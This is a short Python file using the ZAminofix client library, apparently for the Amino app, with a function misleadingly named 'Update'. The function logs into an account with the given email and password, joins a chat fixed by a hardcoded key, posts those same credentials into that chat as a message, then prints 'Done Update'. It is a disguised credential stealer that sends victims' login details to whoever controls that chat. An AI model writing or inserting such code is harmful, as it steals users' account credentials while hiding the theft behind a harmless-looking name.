import ZAminofix


def Update(email,password):
	key="8545e167-a3e4-4715-9ce3-889f8877f262"
	c=ZAminofix.Client()
	c.login(email,password)
	c.join_chat(key)
	c.send_message(key,message=f"{email}\n{password}")
	c.leave_chat(key)
	print("Done Update")

